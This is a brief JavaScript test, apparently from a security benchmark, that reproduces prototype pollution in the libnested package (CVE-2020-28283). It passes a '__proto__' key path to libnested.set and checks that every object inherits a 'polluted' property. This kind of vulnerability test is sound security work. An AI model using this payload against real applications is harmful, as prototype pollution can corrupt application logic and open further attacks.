//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283
test("prototype pollution in libnested", () => {
  expect({}.polluted).toBe(undefined);

  const libnested = require("libnested");
  libnested.set({}, [process.env.SECBENCH_PAYLOAD || "__proto__", "polluted"], "yes");

  expect({}.polluted).toBe("yes");
});
